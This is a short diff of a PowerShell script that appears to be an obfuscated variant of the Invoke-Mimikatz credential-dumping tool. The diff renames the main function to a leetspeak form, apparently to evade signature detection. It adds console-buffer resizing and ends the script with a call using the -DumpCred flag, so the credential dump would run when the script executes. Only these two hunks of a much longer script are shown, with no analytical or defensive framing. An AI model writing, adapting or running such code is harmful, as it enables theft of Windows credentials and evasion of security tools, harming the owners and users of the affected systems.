@@ -1,4 +1,4 @@
-﻿function Invoke-M1m1d0gz
+﻿function Invoke-M1m1k@tz
 {
 
 
@@ -2689,6 +2689,16 @@ echo "##M1m1d0gz :-)"
 echo "==============================================="
 echo ""
 
-Invoke-M1m1d0gz -DumpCred
+# Update output buffer size to 500
+if( $Host -and $Host.UI -and $Host.UI.RawUI ) {
+  $rawUI = $Host.UI.RawUI
+  $oldSize = $rawUI.BufferSize
+  $typeName = $oldSize.GetType( ).FullName
+  $newSize = New-Object $typeName (500, $oldSize.Height)
+  $rawUI.BufferSize = $newSize
+}
+
+Invoke-M1m1k@tz -DumpCred
+echo "`n`n`n"
 
 #####################################################
